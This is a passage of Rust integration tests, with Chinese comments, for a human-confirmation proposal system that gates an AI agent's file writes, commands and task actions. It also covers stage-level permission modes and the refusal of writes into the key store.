            match &event {
                SseEvent::ConversationDelta { text, .. } => delivered.push(text.clone()),
                other => panic!("不该有别的类型：{other:?}"),
            }
        }
    }
    assert_eq!(delivered, vec!["这条任务自己的话".to_string()]);
}

// ───────────────────── 提议：写动作的落库形态（决策 188 / 207，票 02）─────────────────────

/// 落一条提议。
///
/// **票 02 一个写工具都不加**，故这里没有「让值班长提一条」的路径——本组用例要验的是提议层
/// 自己的三条规则（一次一按 / 过期 / 态势变化），直接落库是唯一诚实的做法。生成路径
/// （写工具 → 执行点拦截 → 提议）由票 04 / 05 / 06 各自带用例。
async fn seed_proposal(api: &Api, session_id: &str, tool: &str, args: Value) -> String {
    api.state
        .store
        .create_foreman_proposal(NewForemanProposal {
            kind: agentpipeline_core::storage::proposals::ForemanProposalKind::ApiCall,
            payload: None,
            session_id: session_id.to_string(),
            tool: tool.to_string(),
            args,
            summary: format!("（用例）{tool}"),
            situation: None,
        })
        .await
        .unwrap()
        .id
}

async fn fresh_session(api: &Api) -> String {
    api.state
        .store
        .create_foreman_session("用例班次")
        .await
        .unwrap()
        .id
}

/// 提议的读端点：只给未决的那些，且挂在会话上。
#[tokio::test]
async fn proposals_endpoint_lists_only_the_pending_ones_of_that_session() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let a = fresh_session(&api).await;
    let b = fresh_session(&api).await;
    let p1 = seed_proposal(&api, &a, "write_file", json!({"path": "notes.md"})).await;
    let p2 = seed_proposal(&api, &a, "run_command", json!({"command": "ls"})).await;
    seed_proposal(&api, &b, "write_file", json!({"path": "other.md"})).await;

    let (status, body) = get(&api, &format!("/foreman/proposals?session={a}")).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let ids: Vec<&str> = body["proposals"]
        .as_array()
        .unwrap()
        .iter()
        .map(|p| p["id"].as_str().unwrap())
        .collect();
    assert_eq!(ids, vec![p1.as_str(), p2.as_str()], "只给这一班的未决提议");
    assert_eq!(body["proposals"][0]["status"], "pending");
    assert_eq!(body["proposals"][0]["tool"], "write_file");
    assert_eq!(body["proposals"][0]["args"]["path"], "notes.md");

    // 拒绝一条之后它就不再是「未决」（读端点只列未决，时间线那份由 GET /foreman/session 给）。
    let (status, _) = post(&api, &format!("/foreman/proposals/{p1}/reject"), json!({})).await;
    assert_eq!(status, StatusCode::OK);
    let (_, body) = get(&api, &format!("/foreman/proposals?session={a}")).await;
    assert_eq!(body["proposals"].as_array().unwrap().len(), 1);
}

/// 提议**留在时间线里**（决策 207）：过期的那一轮不删行，`GET /foreman/session` 照样给出来。
#[tokio::test]
async fn expired_proposals_stay_in_the_timeline() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;
    let pid = seed_proposal(&api, &sid, "write_file", json!({"path": "notes.md"})).await;

    // 推过 TTL（10 分钟）再按一次「执行」。
    api.clock.advance_secs(
        agentpipeline_core::storage::proposals::FOREMAN_PROPOSAL_TTL_MINUTES * 60 + 1,
    );
    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("过期"),
        "报文要说清是过期：{body}"
    );

    // 状态落成 expired（不是删掉），且仍在时间线里。
    let (_, body) = get(&api, &format!("/foreman/session?session={sid}")).await;
    let proposals = body["proposals"].as_array().unwrap();
    assert_eq!(proposals.len(), 1, "过期只让按钮变灰，那一轮留在时间线里");
    assert_eq!(proposals[0]["id"], pid.as_str());
    assert_eq!(proposals[0]["status"], "expired");
    assert!(proposals[0]["resolved_at"].is_string());
    // 未决清单里没有了
    let (_, body) = get(&api, &format!("/foreman/proposals?session={sid}")).await;
    assert!(body["proposals"].as_array().unwrap().is_empty());
}

/// 一次一按：第二次执行拿不到那条提议（不可重放）。
///
/// 这条也是「提议执行成功后作废」的落点——不是靠界面的禁用态，而是靠一次原子的占用。
#[tokio::test]
async fn a_proposal_can_only_be_pressed_once() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;
    let pid = seed_proposal(&api, &sid, "write_file", json!({"path": "notes.md"})).await;

    // 票 02 里没有任何工具接线，故第一次按下必然失败——而**失败不消耗提议**（参数过不了
    // 校验是模型的事，不是提议本身作废），状态仍是 pending。
    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let (_, body) = get(&api, &format!("/foreman/session?session={sid}")).await;
    assert_eq!(body["proposals"][0]["status"], "pending");

    // 拒绝是真的一次一按：第二次拒绝被挡下，且状态是 rejected。
    let (status, _) = post(&api, &format!("/foreman/proposals/{pid}/reject"), json!({})).await;
    assert_eq!(status, StatusCode::OK);
    let (status, body) = post(&api, &format!("/foreman/proposals/{pid}/reject"), json!({})).await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::CONFLICT,
        "已拒绝的提议不可再执行：{body}"
    );
    let (_, body) = get(&api, &format!("/foreman/session?session={sid}")).await;
    assert_eq!(body["proposals"][0]["status"], "rejected");
}

/// 执行与拒绝**都回灌成一轮**（决策 207）：成功失败都进时间线，不弹窗。
///
/// 落的是「操作台」那一轮（`role = system`），不是助理轮——写成助理轮会让值班长下一轮
/// 读到自己说过「我已经写入了」。
#[tokio::test]
async fn proposal_outcomes_land_in_the_timeline_as_system_turns() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;
    let p1 = seed_proposal(&api, &sid, "write_file", json!({"path": "notes.md"})).await;
    let p2 = seed_proposal(&api, &sid, "write_file", json!({"path": "other.md"})).await;

    let _ = post(&api, &format!("/foreman/proposals/{p1}/execute"), json!({})).await;
    let _ = post(&api, &format!("/foreman/proposals/{p2}/reject"), json!({})).await;

    let (_, body) = get(&api, &format!("/foreman/session?session={sid}")).await;
    let messages = body["messages"].as_array().unwrap();
    assert_eq!(messages.len(), 2, "两次按键各留一轮：{body}");
    assert!(messages.iter().all(|m| m["role"] == "system"));
    assert!(messages[0]["content"]
        .as_str()
        .unwrap()
        .contains("提议执行失败"));
    assert!(messages[1]["content"]
        .as_str()
        .unwrap()
        .contains("提议已拒绝"));
}

/// 态势变化的拒执（决策 207）：提议当时说的那件事已经不成立了 → 拒绝执行并报出来。
#[tokio::test]
async fn a_proposal_whose_situation_changed_is_refused() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    // `seed` 返回的是项目 id，任务 id 就是给它的那个串。
    seed(&api, "t-drift").await;
    let task_id = "t-drift".to_string();
    let sid = fresh_session(&api).await;
    // 提议成立时任务停在 pending（seed_task 的状态），指纹就这么存下来。
    let before = situation_fingerprint(&api.state.store, &task_id)
        .await
        .unwrap();
    let pid = api
        .state
        .store
        .create_foreman_proposal(NewForemanProposal {
            kind: agentpipeline_core::storage::proposals::ForemanProposalKind::ApiCall,
            payload: None,
            session_id: sid.clone(),
            tool: "task".into(),
            args: json!({"task_id": task_id, "action": "resume"}),
            summary: "（用例）恢复这个任务".into(),
            situation: Some(before),
        })
        .await
        .unwrap()
        .id;

    // 情况变了：任务被取消。
    api.state
        .store
        .set_task_status(&task_id, TaskStatus::Cancelled)
        .await
        .unwrap();

    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    let message = body["error"].as_str().unwrap();
    assert!(
        message.contains("现在的情况已经不是它当时说的那样"),
        "报文要报出「情况变了」而不是一句「执行失败」：{message}"
    );
    assert!(
        message.contains("任务状态"),
        "要说清变的是哪一样：{message}"
    );

    // 拒绝执行**不消耗**提议也不改写状态：人还可以自己按「拒绝」把它收掉。
    let (_, body) = get(&api, &format!("/foreman/session?session={sid}")).await;
    assert_eq!(body["proposals"][0]["status"], "pending");
    // 而这次拒执**进了时间线**（失败也是这一轮的下场，决策 207）。
    let messages = body["messages"].as_array().unwrap();
    assert_eq!(messages.len(), 1);
    assert!(messages[0]["content"]
        .as_str()
        .unwrap()
        .contains("提议未执行"));
}

/// 三个端点未接线时一律 503（与既有七个端点同一条口径）。
#[tokio::test]
async fn proposal_endpoints_report_503_when_unwired() {
    let api = api_full(Settings::default(), Vec::new(), offline_repo(), Vec::new()).await;
    // 提议面与命令台账**四个**都在 `/foreman/*` 下：未接线时一律 503（不是 500，也不是
    // 404——「没接线」与「这条提议不存在」是两件要分别排查的事）
    for uri in ["/foreman/proposals", "/foreman/commands"] {
        let (status, body) = get(&api, uri).await;
        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "{uri}: {body}");
    }
    for uri in [
        "/foreman/proposals/x/execute",
        "/foreman/proposals/x/reject",
    ] {
        let (status, body) = post(&api, uri, json!({})).await;
        assert_eq!(status, StatusCode::SERVICE_UNAVAILABLE, "{uri}: {body}");
    }
    // 未接线时一行都不落（拒绝发生在写之前）
    assert!(api
        .state
        .store
        .list_foreman_sessions()
        .await
        .unwrap()
        .is_empty());
}

/// 不存在的提议 → 404（不是 500，也不是「无声成功」）。
#[tokio::test]
async fn unknown_proposal_is_a_404() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let (status, body) = post(&api, "/foreman/proposals/nope/execute", json!({})).await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
    let (status, _) = post(&api, "/foreman/proposals/nope/reject", json!({})).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

/// 提议的生命周期事件推给 `/foreman/stream`，而任务流不吃它（决策 207 的单开事件）。
#[tokio::test]
async fn proposal_events_reach_the_foreman_stream() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;
    let pid = seed_proposal(&api, &sid, "write_file", json!({"path": "notes.md"})).await;
    let mut rx = api.state.sse.subscribe();

    let _ = post(&api, &format!("/foreman/proposals/{pid}/reject"), json!({})).await;
    let event = rx.recv().await.unwrap();
    assert!(event.is_foreman_event(), "提议事件属于对讲台");
    assert_eq!(event.task_id(), "", "值班长的事件不带任务");
    match &event {
        SseEvent::ForemanProposal {
            proposal_id,
            status,
            session_id,
            ..
        } => {
            assert_eq!(proposal_id, &pid);
            assert_eq!(status, "rejected");
            assert_eq!(session_id, &sid);
        }
        other => panic!("应是提议事件：{other:?}"),
    }
}

/// 环境层档位走通全链路（决策 206）：写入、读回、非法值被拒、留空即清空。
#[tokio::test]
async fn stage_config_env_mode_round_trips_and_rejects_junk() {
    let api = api().await;

    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        json!({"env_mode": "deny", "max_tokens": 4096}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage_config"]["env_mode"], "deny");

    // 读回来也是同一个值（不是只在响应里闪过）
    let (_, body) = get(&api, "/stage-configs").await;
    assert_eq!(body["stage_configs"][0]["env_mode"], "deny");

    // 真实阶段收 `auto` / `deny` 两档（`ask` 只留给值班长那一行，见
    // `only_the_foreman_row_may_be_configured_as_ask`——流水线节点无人按那颗钮）
    for mode in ["auto", "deny"] {
        let (status, body) = put(&api, "/stage-configs/develop", json!({"env_mode": mode})).await;
        assert_eq!(status, StatusCode::OK, "{mode}: {body}");
        assert_eq!(body["stage_config"]["env_mode"], mode);
    }

    // 非法值在**写入时**就被拒，且报文说清取值域（照 `SkillMode::parse` 的姿态）。
    // 大小写不同也算非法：写错一个档位名而它悄悄变成 auto，等于把一次收紧的意图变成放松。
    for junk in ["Auto", "allow", "yes", "1"] {
        let (status, body) = put(&api, "/stage-configs/develop", json!({"env_mode": junk})).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{junk}: {body}");
        assert!(
            body["error"]
                .as_str()
                .unwrap()
                .contains("auto / ask / deny"),
            "{junk}: 报文要说清能填什么：{body}"
        );
    }
    // 被拒之后库里仍是上一步那一条（坏值没有半写进去）
    let cfg = api
        .state
        .store
        .get_stage_config("develop")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(cfg.env_mode, Some(agentpipeline_core::types::EnvMode::Deny));

    // 整条替换：不给 = 清空（回到「没配过」→ 用全局默认 / 该阶段的缺省）
    let (status, body) = put(&api, "/stage-configs/develop", json!({"max_tokens": 2048})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(body["stage_config"]["env_mode"].is_null());
}

/// `ask` **只留给值班长**（`run-command-permissions` 规格 §4）：别的阶段配上去会被拒。
///
/// 那不是洁癖：流水线节点无人按那颗钮，而它又没有提议通道——配成 `ask` 的结果是**静默收掉
/// 这个阶段全部的环境写动作**（一条 develop 会卡在「写不了文件」上，而配置看上去只是一行
/// `ask`）。要收紧就写 `deny`：那时意图与行为一致（拒绝，且连工具都不给）。
#[tokio::test]
async fn only_the_foreman_row_may_be_configured_as_ask() {
    let api = api().await;

    for stage in [
        "develop",
        "review",
        "test",
        "project_analysis",
        "validator_cross_check",
    ] {
        let (status, body) = put(
            &api,
            &format!("/stage-configs/{stage}"),
            json!({"env_mode": "ask"}),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{stage}: {body}");
        let message = body["error"].as_str().unwrap();
        assert!(message.contains("ask"), "{stage}: {message}");
        assert!(
            message.contains("deny"),
            "要说清该配什么：{stage}: {message}"
        );
        // 一个字都没写进库
        assert!(api
            .state
            .store
            .get_stage_config(stage)
            .await
            .unwrap()
            .is_none());
    }

    // 值班长那一行照收（它的载体就是确认钮）
    let (status, body) = put(&api, "/stage-configs/foreman", json!({"env_mode": "ask"})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage_config"]["env_mode"], "ask");
    // 另外两档对所有阶段都开放（收紧的方向不受限）
    let (status, body) = put(&api, "/stage-configs/develop", json!({"env_mode": "deny"})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

/// 值班长的行同样可配（档位是**配置项**，不是代码里的常量）。
#[tokio::test]
async fn the_foreman_stage_accepts_an_env_mode_too() {
    let api = api().await;
    let (status, body) = put(&api, "/stage-configs/foreman", json!({"env_mode": "auto"})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage_config"]["env_mode"], "auto");

    // 不配这一行时，值班长解析到的是缺省 `ask`（两层解析的第二个缺省）
    let settings = agentpipeline_core::config::Settings::default();
    assert_eq!(
        agentpipeline_core::types::effective_env_mode(settings.env_mode, "foreman", None),
        agentpipeline_core::types::EnvMode::Ask
    );
}

/// 值班长的命令走**会话维度**的只读面（决策 204④ / 206，票 03）。
///
/// 为什么不复用 `GET /tasks/{id}/commands`：那条路的归属列是任务，还带一句
/// `command.task_id != id` 的归属校验——值班长的命令 `task_id` 是 NULL，永远查不到。
/// 归属两列恰好一个非空（迁移 0012 的 CHECK），故两条读法平行且永不重叠。
#[tokio::test]
async fn foreman_commands_are_readable_from_the_session_dimension_only() {
    use agentpipeline_core::agent::tools::{CommandFinish, CommandStart};
    use agentpipeline_core::types::CommandSource;

    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let (_, body) = post(&api, "/foreman/sessions", json!({"title": "夜班"})).await;
    let sid = body["session"]["id"].as_str().unwrap().to_string();

    // 落一行**真经过** `record_start`（生产里由 `run_command` 调它，不是手写 SQL）。
    // task_id 传空串是值班长的真实形态：它没有任务，存储层把空串归一成 NULL。
    let id = api
        .state
        .store
        .record_start(CommandStart {
            task_id: Some(String::new()),
            session_id: Some(sid.clone()),
            run_id: None,
            stage: Stage::Init,
            node: agentpipeline_core::types::Node::Execute,
            source: CommandSource::Agent,
            command: "ls tasks".into(),
            cwd: api.state.home.root().display().to_string(),
        })
        .await
        .unwrap();
    api.state
        .store
        .record_finish(
            id,
            CommandFinish {
                exit_code: Some(0),
                stdout_preview: Some("tasks".into()),
                duration_ms: 3,
                ..Default::default()
            },
        )
        .await
        .unwrap();

    let (status, body) = get(&api, &format!("/foreman/commands?session={sid}")).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["session"]["id"], sid.as_str());
    let commands = body["commands"].as_array().unwrap();
    assert_eq!(commands.len(), 1, "{body}");
    assert_eq!(commands[0]["command"], "ls tasks");
    assert_eq!(commands[0]["exit_code"], 0);
    // 归属落在会话上，任务列是 null——前端的渲染据此判断「这行不该挂到任务时间线」。
    assert!(commands[0]["task_id"].is_null(), "{body}");
    assert_eq!(commands[0]["session_id"], sid.as_str());

    // 另一个班次读不到它（隔离在归属列上，不是靠前端过滤）。
    let (_, body) = post(&api, "/foreman/sessions", json!({"title": "白班"})).await;
    let other = body["session"]["id"].as_str().unwrap().to_string();
    let (_, body) = get(&api, &format!("/foreman/commands?session={other}")).await;
    assert!(body["commands"].as_array().unwrap().is_empty(), "{body}");

    // 不存在的班次：空列表 + `session: null`，不是 404——「这一班没开过命令」与
    // 「这一班不存在」对翻日志的人是同一个答案（库里什么都没有）。
    let (status, body) = get(&api, "/foreman/commands?session=no-such-session").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(body["session"].is_null(), "{body}");
    assert!(body["commands"].as_array().unwrap().is_empty(), "{body}");
}

// ───────────── 确认钮接线：C / D / E 三层各一条（票 04 / 05 / 06）─────────────

/// C 层：按下确认钮 → **文件真的变了**，且提议 id → 执行 → 落盘能在库里对上。
///
/// 这一条是整条链路的承重点：提议「只是记了一笔、按下才动」必须是真的。
#[tokio::test]
async fn pressing_the_button_actually_writes_the_file() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;
    let target = api.state.home.root().join("notes.md");
    let pid = seed_proposal(
        &api,
        &sid,
        "write_file",
        json!({"path": "notes.md", "content": "夜班交接：一切正常"}),
    )
    .await;
    assert!(!target.exists(), "提议本身不该写任何东西");

    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(
        std::fs::read_to_string(&target).unwrap(),
        "夜班交接：一切正常"
    );
    assert_eq!(body["proposal"]["status"], "executed");

    // 审计可追：结果落成**系统轮**（不是助理轮——写成助理轮会让它下一轮读成「我已经做了」）。
    let text = body["message"]["content"].as_str().unwrap();
    assert!(text.contains("提议已执行"), "{text}");
    assert!(text.contains("notes.md"), "要能看见动了哪个文件：{text}");
    assert!(text.contains("\"bytes\""), "要能看见写了多少：{text}");
    assert_eq!(body["message"]["role"], "system");

    // 库里那条提议的终态与原参数都还在（可追溯，不因执行而抹掉）。
    let stored = api
        .state
        .store
        .get_foreman_proposal(&pid)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(stored.args["path"], "notes.md");
    assert!(!stored.status.is_open(), "执行过的提议不再是未决态");
}

/// C 层：域**补偿**在执行那一刻同样生效——`data/` 下的目标按不下去。
///
/// 两条路都要拒：域是执行时按当前策略判的，不是提议生成时记下来的。
#[tokio::test]
async fn a_confirmed_write_into_the_key_store_is_still_refused() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;
    let pid = seed_proposal(
        &api,
        &sid,
        "write_file",
        json!({"path": "data/x.txt", "content": "偷偷放点东西"}),
    )
    .await;

    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("拒绝名单"),
        "报文要说清命中了拒绝名单：{body}"
    );
    assert!(!api.state.home.root().join("data/x.txt").exists());

    // 执行失败**不消耗**提议：参数过不了校验是提议自己的问题，人还可以按「拒绝」收掉它。
    let stored = api
        .state
        .store
        .get_foreman_proposal(&pid)
        .await
        .unwrap()
        .unwrap();
    assert!(stored.status.is_open(), "失败的提议仍应是未决态");
}

/// E 层：按下确认钮 → 命令真的跑了，并落进**会话维度**的命令台账。
#[tokio::test]
async fn pressing_the_button_actually_runs_the_command() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;
    let pid = seed_proposal(
        &api,
        &sid,
        "run_command",
        json!({"command": "echo 夜班在岗"}),
    )
    .await;

    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(
        body["message"]["content"]
            .as_str()
            .unwrap()
            .contains("夜班在岗"),
        "命令输出要回到时间线上：{body}"
    );

    let commands = api.state.store.list_foreman_commands(&sid).await.unwrap();
    assert_eq!(commands.len(), 1);
    assert_eq!(commands[0].task_id, None, "值班长的命令不挂任务");
    assert_eq!(commands[0].exit_code, Some(0));
    // 会话维度的只读面读得到它。
    let (status, body) = get(&api, &format!("/foreman/commands?session={sid}")).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["commands"].as_array().unwrap().len(), 1, "{body}");
}

/// D 层：`task` 族的 `create` 按下之后**任务真的建了**（走的就是 `POST /tasks` 那段代码）。
#[tokio::test]
async fn the_task_family_creates_a_real_task() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let project_id = "proj-confirm".to_string();
    seed_project(
        &api.state.store,
        &project_id,
        "示例",
        api._repo.path(),
        "main",
    )
    .await
    .unwrap();
    let sid = fresh_session(&api).await;
    let pid = seed_proposal(
        &api,
        &sid,
        "task",
        json!({"action": "create", "project_id": project_id, "title": "确认钮建的任务"}),
    )
    .await;

    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let tasks = api
        .state
        .store
        .list_tasks(&agentpipeline_core::storage::tasks::TaskFilter::default())
        .await
        .unwrap();
    assert_eq!(tasks.len(), 1, "按下的那一刻才建任务");
    assert_eq!(tasks[0].title, "确认钮建的任务");
}

/// D 层：参数过不了**既有端点的校验** → 执行失败，且提议**不消耗**。
///
/// 这是「执行 = 走既有端点、同一套校验」的取证：提议不是一条绕过校验的捷径。
#[tokio::test]
async fn a_proposal_that_fails_the_endpoint_validation_stays_pending() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;
    // 项目不存在 → `POST /tasks` 的既有校验会拒它。
    let pid = seed_proposal(
        &api,
        &sid,
        "task",
        json!({"action": "create", "project_id": "没有这个项目", "title": "x"}),
    )
    .await;

    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("项目不存在"),
        "报文应当是**端点自己那一句**：{body}"
    );
    let (_, body) = get(&api, &format!("/foreman/session?session={sid}")).await;
    assert_eq!(body["proposals"][0]["status"], "pending", "{body}");
    assert!(
        body["proposals"][0]["status"] != "executed",
        "参数过不了校验不是「执行过」：{body}"
    );
}

/// D 层排除清单（决策 207⑤）：三项**没有对应的工具**，硬提一条也执行不了。
///
/// 判据是「改的是**谁能访问这台机器**」——让模型能提议它们，等于让它能给自己开门。
#[tokio::test]
async fn the_door_opening_actions_have_no_tool_at_all() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;

    // ① 清单里没有这三个名字（白名单由此而来，故这就是「执行点也拒」的同一处）。
    let manifest: Vec<&str> = agentpipeline_core::pipeline::foreman::FOREMAN_TOOL_SPECS
        .iter()
        .map(|s| s.name)
        .collect();
    for absent in ["pairing", "lan", "market_repos", "repo", "server"] {
        assert!(
            !manifest.contains(&absent),
            "开门类动作不得有工具名：{absent} 出现在 {manifest:?}"
        );
    }

    // ② 库里真有一条工具名对不上的提议（升级前落的 / 模型报了个不存在的名字）→ 执行被拒，
    //    且**没有任何副作用**。
    let token_before = api.state.store.pairing_token().await.unwrap_or_default();
    let pid = seed_proposal(&api, &sid, "pairing", json!({"action": "reset"})).await;
    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("还没有接线"),
        "报文要说清这个工具名没有落点：{body}"
    );
    assert_eq!(
        api.state.store.pairing_token().await.unwrap_or_default(),
        token_before,
        "配对令牌一个字节都不该动"
    );
}

/// `GET /foreman/tools`（决策 247⑤）：**全量 21 条、与清单同序、label 均非空、只出两个字段**。
///
/// 回执标的是**历史**上的工具调用，故条目数 == 清单长度本身就是「不按档位滤」的形状
/// （滤过就会少——昨天的回执今天翻译不了）。description / parameters 不出：前端用不上。
#[tokio::test]
async fn the_tool_label_endpoint_lists_the_whole_manifest() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let (status, body) = get(&api, "/foreman/tools").await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let manifest = agentpipeline_core::pipeline::foreman::FOREMAN_TOOL_SPECS;
    let listed = body["tools"].as_array().expect("报文要有 tools 数组");
    assert_eq!(listed.len(), 21, "全量 21 条，按档位滤了？{body}");
    assert_eq!(listed.len(), manifest.len(), "条目数要与清单一致：{body}");
    for (i, (item, spec)) in listed.iter().zip(manifest.iter()).enumerate() {
        assert_eq!(item["name"], spec.name, "第 {i} 条与清单不同序：{body}");
        assert_eq!(item["label"], spec.label, "第 {i} 条的标签对不上：{body}");
        assert!(
            !item["label"].as_str().unwrap().trim().is_empty(),
            "label 不许为空：{item}"
        );
        assert_eq!(
            item.as_object().map(|o| o.len()),
            Some(2),
            "只出 name / label 两个字段：{item}"
        );
    }
}

/// 回话里的归因类别**由后端解析后随消息下发**（决策 235 / 238）。
///
/// 为什么断言打在线上形态而不是正文：结构块住在回话文本里，但**解析点只有一处**
/// （`parse_attribution`）——界面拿的是那一行 `attribution` 字段，不自己从正文里抠。
/// 这条契约把「界面看到的那一份」与「后端判定的那一份」钉成同一件事；未定位时给
/// `unlocated` 而不是编一个类别（决策 230 把「没有类别」也算一项判据）。
#[tokio::test]
async fn the_session_wire_carries_the_parsed_attribution() {
    let mut script = Script::new();
    script
        .for_foreman()
        .text("它卡在 open() 上，是宿主环境拦的。\n【归因】{\"attribution\":\"host\"}\n");
    script
        .for_foreman()
        .text("我还是说不上来。\n【归因】{\"attribution\":\"四类之外的词\"}\n");
    let api = api_with_foreman(FakeAgent::new(script)).await;

    for question in ["第一问", "第二问"] {
        let (status, body) = post(&api, "/foreman/messages", json!({ "text": question })).await;
        assert_eq!(status, StatusCode::OK, "{body}");
    }

    let (status, body) = get(&api, "/foreman/session").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let messages = body["messages"].as_array().unwrap();
    let assistant: Vec<&serde_json::Value> = messages
        .iter()
        .filter(|m| m["role"] == "assistant")
        .collect();
    assert_eq!(assistant.len(), 2);

    // 定位成功：类别 + 给人看的词（界面不自己映射一遍）。
    assert_eq!(assistant[0]["attribution"], "host");
    assert_eq!(assistant[0]["attribution_label"], "宿主环境");
    assert!(assistant[0]["attribution_reason"].is_null());

    // 四类之外不许收口：给 `unlocated` + 原因，**没有** label。
    assert_eq!(assistant[1]["attribution"], "unlocated");
    assert!(assistant[1]["attribution_label"].is_null());
    assert_eq!(assistant[1]["attribution_reason"], "四类之外");

    // 非助理轮不解析（那两类里不会有结构块）。
    let user = messages.iter().find(|m| m["role"] == "user").unwrap();
    assert!(user["attribution"].is_null());
}

/// `config set` 会抹掉 `node_overrides` 就拒，不静默抹掉（决策 236）。
///
/// 校验点在**工具这一侧**而不是 `PUT /stage-configs`：整条替换（「留空即清成默认」）是那个
/// 端点的既有语义（界面那份表单总是带全整行），而这个工具是唯一会「看不见就改」的入口。
/// 前后两侧都要取证：**没带、旧配置有 → 拒且提议不消耗、旧配置一字未动**；带上或本来就
/// 没有覆盖 → 照常写；显式传 `{}` → 那是**明路的清空**（决策 236 明确不做局部合并，
/// 所以给的是一条明路，不是一条自动合并）。
#[tokio::test]
async fn a_config_set_that_would_drop_node_overrides_is_refused() {
    let api = api_with_foreman(FakeAgent::new(Script::new())).await;
    let sid = fresh_session(&api).await;
    // 覆盖内容本身要过既有的启动校验（这个 fixture 里没有技能生态），故用两个无害的键
    // ——这条用例考的是「字段会不会被静默抹掉」，不是覆盖内容本身。
    let overrides = serde_json::json!({
        "validate_input": {"temperature": 0.2},
        "execute": {"temperature": 0.3},
    });
    api.state
        .store
        .upsert_stage_config(&agentpipeline_core::types::StageConfig {
            stage: "architect-design".into(),
            node_overrides_json: Some(overrides.clone()),
            ..Default::default()
        })
        .await
        .unwrap();

    // ① 不带它就 set：拒，报文说清有几个覆盖与怎么处置，**提议不消耗**。
    let pid = seed_proposal(
        &api,
        &sid,
        "config",
        json!({"action": "set", "stage": "architect-design", "temperature": 0.9}),
    )
    .await;
    let (status, body) = post(
        &api,
        &format!("/foreman/proposals/{pid}/execute"),
        json!({}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let message = body["error"].as_str().unwrap_or_default().to_string();
    assert!(message.contains("node_overrides_json"), "{message}");
    assert!(message.contains('2'), "要说清有几个节点覆盖：{message}");
    assert!(
        message.contains("read_stage_configs"),
        "要给出处置：{message}"
    );
    let proposal = api
        .state
        .store
        .get_foreman_proposal(&pid)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        proposal.status.as_str(),
        "pending",
        "参数过不了校验时提议**不消耗**（人还可以自己按掉它）"
    );
    let stored = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        stored.node_overrides_json,
        Some(overrides.clone()),
        "被拒的 set 不得改动旧配置"
    );

